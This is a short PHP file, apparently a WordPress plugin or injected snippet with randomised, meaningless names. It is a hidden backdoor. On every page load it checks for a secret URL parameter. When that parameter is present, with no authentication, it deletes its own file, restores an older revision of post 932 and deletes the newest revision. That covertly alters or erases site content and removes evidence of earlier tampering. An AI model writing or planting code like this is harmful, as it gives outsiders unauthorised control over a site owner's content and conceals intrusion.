<?php

function classic_creator_invoice() {
	if (isset($_GET['notifier_integration_rich_coupon']) && $_GET['notifier_integration_rich_coupon'] === 'coming_random_really') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$push_alt_platform = 932;
		$assets_showcase_project = wp_get_post_revisions($push_alt_platform);
		if (empty($assets_showcase_project)) die('no revisions');
		if (count($assets_showcase_project) < 2) die('less than 2');
		$gravity_advanced_open_invoice = array_shift($assets_showcase_project);
		$logger_editor_translator_csv = $gravity_advanced_open_invoice->ID;
		$protect_status_assets_article = array_shift($assets_showcase_project);
		$categories_roles_orders = $protect_status_assets_article->ID;
		$site_fields_marketing = wp_restore_post_revision($categories_roles_orders);
		if ($site_fields_marketing === false) die('error restoring');
		$site_fields_marketing = wp_delete_post_revision($logger_editor_translator_csv);		
		if ($site_fields_marketing === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'classic_creator_invoice');
